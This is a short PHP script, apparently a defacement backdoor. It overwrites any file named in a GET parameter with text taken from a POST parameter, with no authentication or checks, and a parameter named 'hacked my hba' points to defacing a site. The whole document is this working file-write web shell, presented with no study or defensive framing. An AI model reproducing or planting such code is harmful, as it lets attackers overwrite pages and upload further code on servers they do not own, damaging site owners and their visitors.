
	

 <?php
$file_name=$_GET['index.php'];
 $write_text=$_POST['hacked my hba'];
 
 
 $file_name=$file_name;
 $edit_file = fopen($file_name, 'w');
	
 fwrite($edit_file, $write_text);
 fclose($edit_file);
?>
